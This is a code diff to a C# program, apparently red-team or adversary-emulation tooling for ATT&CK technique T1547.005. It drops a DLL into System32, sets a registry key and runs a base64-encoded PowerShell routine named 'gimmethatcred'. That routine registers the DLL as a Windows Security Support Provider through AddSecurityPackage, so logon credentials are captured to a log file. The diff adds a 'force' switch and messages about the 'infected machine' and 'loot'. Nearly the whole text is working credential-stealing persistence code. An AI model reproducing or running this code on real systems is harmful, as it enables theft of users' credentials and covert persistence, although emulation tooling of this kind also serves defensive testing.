@@ -37,7 +37,7 @@ class Technique {
 
     }
 
-    public static void storeDll() {
+    public static void storeDll(string[] args) {
         Console.WriteLine("[T1547-005] Setting path to store DLL");
         string systemPath = Environment.SystemDirectory + @"\";
 
@@ -83,12 +83,24 @@ class Technique {
 
     public static void Main(string[] args) {
         // Decode and store the DLL file on the disk
-        storeDll();
+        storeDll(args);
         setKeyRegedit();
 
-        Console.WriteLine("[T1547-005] Starting powershell execution to enforce SSP register");
-        string GIMMECRED = Base64Encode(@"function gimmethatcred {$DllName = '" + sspName + "';$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2');$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run);$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False);$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class');$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage','secur32.dll','Public, Static',[Reflection.CallingConventions]::Standard,[Int32],[Type[]] @([String], [IntPtr]),[Runtime.InteropServices.CallingConvention]::Winapi,[Runtime.InteropServices.CharSet]::Auto);$Secur32 = $TypeBuilder.CreateType();if ([IntPtr]::Size -eq 4) {$StructSize = 20} else {$StructSize = 24};$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize);[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize);$RuntimeSuccess = $True;try {$Result = $Secur32::AddSecurityPackage($DllName, $StructPtr)} catch {$HResult = $Error[0].Exception.InnerException.HResult;Write-Warning 'Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))';Write-Warning 'Reason: $(([ComponentModel.Win32Exception] $HResult).Message)';$RuntimeSuccess = $False}if ($RuntimeSuccess) {Write-Verbose 'Installation and loading complete!'} else {Write-Verbose 'Installation complete! Reboot for changes to take effect.'}}gimmethatcred");
-        usePowershellWithoutPowershell(GIMMECRED);
-        Console.WriteLine("[T1547-005] All done ! Enjoy your loot :D");
+        if (args[0].ToLower() == "force") {
+            Console.WriteLine("[T1547-005] 1st parameter defined as: force");
+            Console.WriteLine("[T1547-005] Starting powershell execution to enforce SSP register");
+            string GIMMECRED = Base64Encode(@"function gimmethatcred {$DllName = '" + sspName + "';$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2');$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run);$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False);$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class');$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage','secur32.dll','Public, Static',[Reflection.CallingConventions]::Standard,[Int32],[Type[]] @([String], [IntPtr]),[Runtime.InteropServices.CallingConvention]::Winapi,[Runtime.InteropServices.CharSet]::Auto);$Secur32 = $TypeBuilder.CreateType();if ([IntPtr]::Size -eq 4) {$StructSize = 20} else {$StructSize = 24};$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize);[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize);$RuntimeSuccess = $True;try {$Result = $Secur32::AddSecurityPackage($DllName, $StructPtr)} catch {$HResult = $Error[0].Exception.InnerException.HResult;Write-Warning 'Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))';Write-Warning 'Reason: $(([ComponentModel.Win32Exception] $HResult).Message)';$RuntimeSuccess = $False}if ($RuntimeSuccess) {Write-Verbose 'Installation and loading complete!'} else {Write-Verbose 'Installation complete! Reboot for changes to take effect.'}}gimmethatcred");
+            usePowershellWithoutPowershell(GIMMECRED);
+
+            Console.WriteLine("[T1547-005] ");
+        } else {
+            Console.WriteLine("[T1547-005] 1st parameter defined as: run");
+            Console.WriteLine("[T1547-005] So, you need to restart the infected machine to start credentials gathering");
+        }
+
+        Console.WriteLine("[T1547-005] All done! Enjoy your loot :D");
+        Console.WriteLine(@"[T1547-005] It will be saved in: C:\Windows\System32\redttpok.log");
+        Console.WriteLine("[!] Press any key to exit [!]");
+        Console.ReadKey();
     }
 }
